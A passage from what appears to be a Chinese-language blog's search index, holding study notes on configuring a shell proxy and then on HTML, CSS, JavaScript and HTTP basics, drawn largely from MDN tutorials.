http_proxy&#x3D;&quot;http:&#x2F;&#x2F;$&#123;hostip&#125;:7890&quot;;</code></pre></p></li><li><p>```bash export http_proxy="socks5://<spanclass="math inline">\({hostip}:7890&quot; exporthttps_proxy=&quot;socks5://\)</span>{hostip}:7890"<pre class="language-none"><code class="language-none">4. &#96;&#96;&#96;bash   export http_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;$&#123;hostip&#125;:7890&quot;   export https_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;$&#123;hostip&#125;:7890&quot;</code></pre></p></li><li><p>如果端口一样就可以合并成一句话，http 的同理</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">all_proxy</span><span class="token operator">=</span><span class="token string">"socks5://<span class="token variable">$&#123;hostip&#125;</span>:7890"</span></code></pre></li><li><p>使用 zsh 应该保存到 <code>~/.zshrc</code></p></li><li><p>更新配置</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web &amp; JavaScript</title>
      <link href="/2023/12/09/web/"/>
      <url>/2023/12/09/web/</url>
      
        <content type="html"><![CDATA[<h3 id="getting-started-with-the-web">Getting started with the web</h3><h4 id="installing-a-local-web-server">Installing a local webserver</h4><ul><li><p><strong>A graphics editor</strong>, like <ahref="https://www.gimp.org/">GIMP</a>, <ahref="https://www.figma.com/">Figma</a>, <ahref="https://www.getpaint.net/">Paint.NET</a>, <ahref="https://www.adobe.com/products/photoshop.html">Photoshop</a>, <ahref="https://www.sketch.com/">Sketch</a> or <ahref="https://www.adobe.com/products/xd.html">XD</a>, to make images orgraphics for your web pages.</p></li><li><p><ahref="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool">Colorpicker tool</a></p></li><li><p><a href="https://fonts.google.com/">Google Fonts</a></p></li><li><p>Browsers, web servers, and programming languages do not handlespaces consistently，文件名小写、短横线连接</p></li></ul><h4 id="dealing-with-files">Dealing with files</h4><h5 id="web-structure">Web Structure</h5><ul><li>index.html</li><li>images</li><li>styles</li><li>scripts</li></ul><h5 id="some-general-rules-for-file-paths">Some general rules for filepaths</h5><ul><li><strong>文件路径：</strong>Windows系统用反斜杠，在Html中用正斜杠<imgsrc="https://s2.loli.net/2023/05/12/pdAWBUHuI12SYg6.png"alt="file-structure" /></li></ul><h4 id="html-basics">HTML basics</h4><ul><li><p>Elements can also have attributes that look like thefollowing:</p><figure><imgsrc="https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web/HTML_basics/grumpy-cat-attribute-small.png"alt="Paragraph opening tag with a class attribute highlighted: class=editor-note" /><figcaption aria-hidden="true">Paragraph opening tag with a classattribute highlighted: class=editor-note</figcaption></figure></li><li><p>属性值加引号</p></li><li><p>空元素</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/firefox-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>My test image<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre></li><li><p>文档解析</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>My test page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/firefox-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>My test image<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><ul><li><code>&lt;!DOCTYPE html&gt;</code> — 文档类型。混沌初分，HTML尚在襁褓（大约是 1991/92 年）之时，<code>DOCTYPE</code> 用来链接一些HTML 编写守则，比如自动查错之类。<code>DOCTYPE</code>在当今作用有限，仅用于保证文档正常读取。现在知道这些就足够了。</li><li><code>&lt;html&gt;&lt;/html&gt;</code>元素。该元素包含整个页面的内容，也称作根元素。</li><li><code>&lt;head&gt;&lt;/head&gt;</code>元素。该元素的内容对用户不可见，其中包含例如面向搜索引擎的搜索关键字（<ahref="https://developer.mozilla.org/zh-CN/docs/Glossary/Keyword">keywords</a>）、页面描述、CSS样式表和字符编码声明等。</li><li><code>&lt;meta charset="utf-8"&gt;</code> — 该元素指定文档使用 UTF-8字符编码，UTF-8 包括绝大多数人类已知语言的字符。基本上 UTF-8可以处理任何文本内容，还可以避免以后出现某些问题，没有理由再选用其他编码。</li><li><code>&lt;title&gt;&lt;/title&gt;</code>元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。</li><li><code>&lt;body&gt;&lt;/body&gt;</code>元素。该元素包含期望让用户在访问页面时看到的内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。</li></ul></li><li><p>List</p><ul><li><strong>无序列表</strong>（UnorderedList）中项目的顺序并不重要，就像购物列表。用一个 <code>ul</code>元素包围。</li><li><strong>有序列表</strong>（OrderedList）中项目的顺序很重要，就像烹调指南。用一个 <code>ol</code>元素包围。</li></ul></li><li><p>Link:以<code>link</code>元素的形式添加进 <code>index.html</code>文档头<code>&lt;head&gt;</code> 和 <code>&lt;/head&gt;</code>之间的任意位置）</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.mozilla.org/zh-CN/about/manifesto/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Mozilla Manifesto<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre></li><li><p>一切即盒子</p></li></ul><h4 id="css">CSS</h4><ul><li><p>将该 CSS 文件连接至 HTML 文档</p><pre class="language-css" data-language="css"><code class="language-css">&lt;link href=<span class="token string">"styles/style.css"</span> rel=<span class="token string">"stylesheet"</span>></code></pre></li><li><p>Structure<imgsrc="https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web/CSS_basics/css-declaration-small.png"alt="图解 CSS 声明" /></p><ul><li><p>多元素选择</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p, li, h1</span> <span class="token punctuation">&#123;</span>  <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul></li><li><p>选择器</p></li><li><p>为了使图像有外边距，我们必须使用 <code>display: block</code>给予其块级行为。</p></li></ul><h4 id="javascript-基础">JavaScript 基础</h4><ul><li><p><code>JavaScript</code>是一门编程语言，可为网站添加交互功能（例如：游戏、动态样式、动画以及在按下按钮或收到表单数据时做出的响应等）</p></li><li><p>在 <code>index.html</code> 文件<code>&lt;/body&gt;</code>标签前的新行添加以下代码。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"scripts/main.js"</span> defer<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p><strong>注</strong>：将 JavaScript 代码放在 HTML页面的底部附近通常是最好的策略。</p></li><li><p>变量:关键字 <code>let</code> 或 <code>var</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> myVariable<span class="token punctuation">;</span></code></pre></li><li><p><strong>赋值运算符：</strong></p><table><colgroup><col style="width: 5%" /><col style="width: 50%" /><col style="width: 4%" /><col style="width: 39%" /></colgroup><thead><tr class="header"><th style="text-align: left;">等于</th><th>测试两个值是否相等，并返回一个 <code>true</code>/<code>false</code>（布尔）值。</th><th><code>===</code></th><th><code>let myVariable = 3;myVariable === 4; // false</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">不等于</td><td>和等于运算符相反，测试两个值是否不相等，并返回一个<code>true</code>/<code>false</code> （布尔）值。</td><td><code>!==</code></td><td><code>let myVariable = 3;myVariable !== 3; // false</code></td></tr></tbody></table></li><li><p><strong>事件</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"别戳我，我怕疼。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>解析：</strong> 回调函数，匿名函数。</p><p><strong>写法2</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'别戳我，我怕疼。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>图片切换</strong>：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> myImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myImage<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> mySrc <span class="token operator">=</span> myImage<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mySrc <span class="token operator">===</span> <span class="token string">'images/firefox-icon.png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      myImage<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> <span class="token string">'images/firefox2.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      myImage<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> <span class="token string">'images/firefox-icon.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h4 id="发布网站">发布网站</h4><ul><li><p><strong>Google App Engine</strong> 是一个让你可以在 Google的基础架构上构建和运行应用的强劲平台——无论你是需要从头开始构建多级 web应用还是托管一个静态网站</p></li><li><p><code>HTTP</code>（Hypertext TransferProtocol）是一种用于传输超媒体文档的应用层协议。它被设计用于 Web浏览器和 Web 服务器之间的通信，但也可以用于其他用途。</p><p>HTTP协议是<strong>无状态</strong>的，意味着它不会保存关于每个客户端请求的状态信息。每个请求都被视为独立的，没有任何关联。HTTP协议是基于客户端-服务器模型的，客户端发起请求，服务器响应请求。</p><p>HTTP 协议主要由两个部分组成：请求和响应。一个请求由请求方法、请求URL、请求头部和请求体四部分组成；一个响应由响应状态码、响应头部和响应体三部分组成。</p><p><strong>请求</strong>方法指定客户端请求的动作类型，例如GET、POST、PUT、DELETE 等。请求 URL指定要访问的资源地址，请求头部包含有关请求的<strong>元数据</strong>，例如Accept、Accept-Language、User-Agent 等，请求体包含与请求相关的数据。</p><p><strong>响应</strong>状态码是一个三位数字，指示服务器响应的状态。常见的状态码包括200（请求成功）、301（永久重定向）、404（请求的资源不存在）和500（服务器内部错误）等。响应头部包含有关响应的<strong>元数据</strong>，例如Content-Type、Content-Length、Set-Cookie 等。响应体包含响应数据，例如HTML、JSON、图片等。</p><p>HTTP 协议是一个开放标准，由 W3C 组织和 IETF 组织共同维护。HTTP/1.1是目前最广泛使用的版本，而 HTTP/2 和 HTTP/3是新的协议版本，其主要特点是支持多路复用和二进制格式。</p></li><li><p><strong>解析</strong>组成文件的<strong>顺序</strong></p><ol type="1"><li>浏览器首先解析 HTML 文件，识别出所有的 <code>&lt;link&gt;</code> 和<code>&lt;script&gt;</code> 元素</li><li>继续解析 HTML 文件的同时，获取并解析 CSS 文件和 JavaScript脚本文件。</li><li><code>DOM</code>树，<code>CSSOM</code>树，编译执行<code>Js</code>脚本</li><li>绘制出网页</li></ol></li><li><p>如果网页以<strong>单个大的数据块</strong>形式传输，一次就只有一个用户下载</p></li></ul><h3 id="html">Html</h3><h4 id="简介-元信息">简介 &amp; 元信息</h4><ul><li><p>元素</p></li><li><p>块级元素和内联元素</p></li><li><p>空元素</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://roy-tian.github.io/learning-area/extras/getting-started-web/beginner-html-site/images/firefox-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Firefox 图标<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li><li><p>属性<imgsrc="https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Getting_started/grumpy-cat-attribute-small.png"alt="含有‘class=&quot;editor-note&quot;’属性的段落标签" /></p><p><code>&lt;a&gt;&lt;/a&gt;</code></p><ol type="1"><li><p><code>href</code></p></li><li><p><code>title</code></p></li><li><p><code>target</code>: 是否在新标签中打开超链</p></li><li><p>布尔属性</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>disabled<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre></li></ol></li><li><p><strong>Html中的空白 </strong>： 无论你在 HTML元素的内容中使用多少空格（包括一个或多个空白字符或换行），当渲染这些代码的时候，HTML解释器会将连续出现的空白字符减少为一个单独的空格符。</p></li><li><p><strong>实体引用</strong>：在Html中包含特殊字符</p><ul><li><ahref="https://zh.wikipedia.org/wiki/XML与HTML字符实体引用列表">XML 和HTML 字符实体引用列表</a></li></ul></li><li><p><strong>注释</strong> 用特殊的记号 <code>&lt;!--</code> 和<code>--&gt;</code> 包裹起来</p></li><li><p><strong>SEO</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>  <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span>  <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>The MDN Web Docs site  provides information about Open Web technologies  including HTML, CSS, and APIs for both Web sites and  progressive web apps.<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre></li><li><p>同时最好加上 <code>defer</code> 以告诉浏览器在解析完成 HTML后再加载 JavaScript。这样可以确保在加载脚本之前浏览器已经解析了所有的HTML 内容</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>my-js-file.js<span class="token punctuation">"</span></span> <span class="token attr-name">defer</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre></li><li><p><code>lang</code>属性</p></li></ul><h4 id="文本处理基础">文本处理基础</h4><ul><li><code>&lt;span&gt;&lt;/span&gt;</code></li></ul><h4 id="超链接">超链接</h4><ul><li><p>图片链接</p></li><li><p><code>title</code>属性</p></li><li><p>文档片段</p></li><li><p>大多数 web 服务器会默认访问加载 <code>index.html</code>这类页面</p></li><li><p><code>download</code>属性</p></li><li><p><strong>电子邮件链接</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mailto:nowhere@mozilla.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>向 nowhere 发邮件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre></li></ul><h4 id="文本处理进阶">文本处理进阶</h4><ul><li><code>&lt;dd&gt;&lt;/dd&gt;</code> &amp;<code>&lt;dt&gt;&lt;/dt&gt;</code></li><li>引用 <code>&lt;blockquote&gt;&lt;/blockquote&gt;</code></li><li>引文 <code>&lt;cite&gt;&lt;/cite&gt;</code></li></ul><h4 id="展示计算机代码">展示计算机代码</h4><ul><li><code>&lt;code&gt;</code> 用于标记计算机通用代码。</li><li><code>&lt;pre&gt;</code>：用于保留空白字符（通常用于代码块）——如果文本中使用了缩进或多余的空白，浏览器将忽略它，你将不会在呈现的页面上看到它。但是，如果你将文本包含在<code>&lt;pre&gt;&lt;/pre&gt;</code>标签中，那么空白将会以与你在文本编辑器中看到的相同的方式渲染出来。</li><li><code>var</code> ：用于标记具体变量名。</li><li><code>&lt;kbd&gt;</code>用于标记输入电脑的键盘（或其他类型）输入。</li><li><code>&lt;samp&gt;</code> ：用于标记计算机程序的输出。</li></ul><h4 id="文档与网站架构">文档与网站架构</h4><ul><li><p>页眉</p></li><li><p>导航栏</p></li><li><p>侧边栏</p></li><li><p>页脚</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>：页眉。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span><span class="token punctuation">></span></span>：导航栏。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span>：主内容。主内容中还可以有各种子内容区段，可用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span> 和 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 等元素表示。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aside</span><span class="token punctuation">></span></span>：侧边栏，经常嵌套在 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span> 中。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>：页脚。</code></pre></li><li><p><strong>无语义元素</strong></p><ul><li>块级<code>&lt;div&gt;</code></li><li>内联级<code>&lt;span&gt;</code></li></ul></li><li><p><a href="https://validator.w3.org/">Html验证</a></p></li></ul><h4 id="图片">图片</h4><ul><li><code>alt</code></li><li><code>title</code></li><li><code>figure</code>和 <code>figcaption</code> 同时使用</li></ul><h4 id="音视频">音视频</h4><ul><li><p><code>&lt;video&gt;</code></p></li><li><p><code>controls</code> :页面控制</p></li><li><p><code>&lt;source&gt;</code></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">controls</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rabbit320.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rabbit320.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>你的浏览器不支持 HTML5 视频。可点击<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rabbit320.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>此链接<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>观看<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code></pre></li></ul><h4 id="显示音轨文本">显示音轨文本</h4><ul><li><p><code>WebVTT</code></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">controls</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>example.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>example.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>track</span> <span class="token attr-name">kind</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>subtitles<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>subtitles_en.vtt<span class="token punctuation">"</span></span> <span class="token attr-name">srclang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code></pre><p><code>&lt;track&gt;</code> 元素用于在 HTML视频播放器中添加字幕或标题轨道。它是用于添加音频或视频媒体的外部文本资源，以提供字幕、翻译或其他附加内容。</p><p>在给定的示例中，<code>&lt;track&gt;</code> 元素有以下属性：</p><ul><li><code>kind</code>: 指定字幕或标题的类型。在这里，<code>kind</code>属性被设置为 <code>"subtitles"</code>，表示这是一个字幕轨道。</li><li><code>src</code>: 指定字幕文件的路径。在示例中，<code>src</code>属性被设置为 <code>"subtitles_en.vtt"</code>，表示字幕文件的路径为<code>"subtitles_en.vtt"</code>。</li><li><code>srclang</code>:指定字幕语言的代码。在这里，<code>srclang</code> 属性被设置为<code>"en"</code>，表示字幕的语言是英语。</li></ul><p>通过将 <code>&lt;track&gt;</code> 元素添加到<code>&lt;video&gt;</code>元素中，浏览器将加载指定路径的字幕文件，并根据提供的语言代码进行解析和显示。这样，用户就可以选择打开或关闭字幕，以便在观看视频时获得字幕内容。</p><p>需要注意的是，字幕文件通常是使用 WebVTT（Web视频文本轨道）格式创建的，该格式支持字幕的时间码和样式设置。确保字幕文件与视频文件相关联，并且语言代码与<code>&lt;track&gt;</code> 元素的 <code>srclang</code>属性匹配，以正确显示字幕内容。</p></li></ul><h4 id="嵌入技术">嵌入技术</h4><ul><li><p><code>iframe</code></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://developer.mozilla.org/zh-CN/docs/Glossary<span class="token punctuation">"</span></span>        <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>500<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>        <span class="token attr-name">allowfullscreen</span> <span class="token attr-name">sandbox</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://developer.mozilla.org/zh-CN/docs/Glossary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Fallback link for browsers that don't support iframes  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><p>在给定的示例中，<code>&lt;iframe&gt;</code>元素用于嵌入一个网页或文档作为子文档。以下是各个属性的解释：</p><ul><li><code>src</code>：指定要嵌入的文档的 URL。在这个例子中，URL 是<code>"https://developer.mozilla.org/zh-CN/docs/Glossary"</code>，表示要嵌入的文档是Mozilla 开发者网络（MDN）的中文词汇表页面。</li><li><code>width</code>：指定 <code>&lt;iframe&gt;</code>元素的宽度。在这里，宽度被设置为<code>"100%"</code>，表示它应该填充父容器的整个宽度。</li><li><code>height</code>：指定 <code>&lt;iframe&gt;</code>元素的高度。在这个例子中，高度被设置为 <code>500</code>像素，表示它的高度为 500 像素。</li><li><code>frameborder</code>：指定是否显示 <code>&lt;iframe&gt;</code>元素周围的边框。在这里，<code>frameborder</code> 属性被设置为<code>"0"</code>，表示不显示边框。</li><li><code>allowfullscreen</code>：指定是否允许在全屏模式下显示嵌入的内容。在这个例子中，<code>allowfullscreen</code>属性被设置，表示允许全屏显示嵌入的内容。</li><li><code>sandbox</code>：<strong>安全属性</strong>，指定是否启用沙盒模式。沙盒模式可以限制嵌入的内容的行为，提供安全性保护。在这里，<code>sandbox</code>属性被设置，表示启用沙盒模式。</li></ul><p>在 <code>&lt;iframe&gt;</code>元素的起始标签和结束标签之间，可以添加一个回退链接（fallbacklink）。这是为了在不支持 <code>&lt;iframe&gt;</code>的浏览器中提供一个替代的链接，以便用户可以访问嵌入的内容。在给定的示例中，<code>&lt;p&gt;</code>元素包含一个 <code>&lt;a&gt;</code>元素，提供一个指向相同内容的链接。如果浏览器不支持<code>&lt;iframe&gt;</code>，则会显示回退链接。</p><p>总结起来，给定的代码片段使用 <code>&lt;iframe&gt;</code>元素嵌入了一个指定 